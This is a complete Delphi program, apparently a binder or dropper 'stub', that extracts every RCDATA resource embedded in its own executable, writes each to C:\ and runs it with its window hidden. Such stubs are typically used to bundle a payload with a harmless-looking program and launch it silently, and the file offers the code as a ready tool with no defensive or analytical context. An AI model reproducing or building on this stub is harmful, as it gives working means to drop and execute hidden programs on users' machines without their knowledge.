{A very Lite stub for extraction and execution of multiple files.
 Author: TM
}
program Stub;

uses
  Windows, ShellApi;

function EnumNamesFunc(hModule:THANDLE; lpType, lpName:PChar; lParam:DWORD):BOOL; stdcall;
var
  Info, FH, BW:DWORD;
begin
  Result:= True;
  Info:= FindResource(0, lpName, lpType);
  FH:= CreateFile(PChar('C:\'+lpName), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  WriteFile(FH, LockResource(LoadResource(0, Info))^, SizeOfResource(0, Info), BW, nil);
  CloseHandle(FH);
  ShellExecute(0, 'OPEN', PChar('C:\'+lpName), '', '', 0);
end;

begin
  EnumResourceNames(0, RT_RCDATA, @EnumNamesFunc, 0);
end.
 